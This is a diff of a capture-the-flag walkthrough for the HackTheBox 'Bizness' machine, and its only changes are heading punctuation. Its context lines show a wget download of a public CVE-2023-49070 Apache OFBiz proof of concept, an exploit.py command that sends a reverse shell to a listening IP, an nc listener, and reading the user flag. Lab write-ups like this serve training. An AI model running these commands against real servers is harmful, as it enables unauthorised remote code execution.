@@ -40,7 +40,7 @@ As we initiate enumeration, a preliminary port scan discloses the accessibility 
 ![Bizness](https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/2e2cdf84-96c0-453e-acf2-083c71d1a947)
 
 
-## Exploring the Vast Horizons of the Web .
+## Exploring the Vast Horizons of the Web:
 Now let’s move to the next step for enumeration. Let’s use dirsearch tool to search for other endpoints.
 
 ```bash
@@ -54,7 +54,7 @@ After doing directory enumeration we see there directory of /control/login
 ![Bizness Login](https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/681a5c2c-5923-4f93-9446-aaf5add44414)
 
 
-## Art of Exploitation: Navigating Security Challenges :
+## Art of Exploitation: Navigating Security Challenges:
 "Upon entering the login page, it becomes evident that the system employs the Apache OFBiz web framework. Subsequent investigation yielded the following insights."
 
 
@@ -81,7 +81,7 @@ wget https://raw.githubusercontent.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-PO
 
 Now we see that we can execute any command by using the above exploit . So, we try to get reverse shell.
 
-## Executing the Payload
+## Executing the Payload:
 
 ```bash
 python3 exploit.py https://bizness.htb/ shell ip:4444
@@ -95,7 +95,7 @@ nc -lnvp 4444
 
 then you will get user shell ....
 
-## User Flag :
+## User Flag:
 
 Upon successfully obtaining the reverse shell, navigating directories became a challenge. Fret not, as I've got you covered. Change the directory to /home/ofbiz, where you'll find a text file named user.txt. Simply execute 'cat' on the file, and voila! You've secured the user flag. 
 
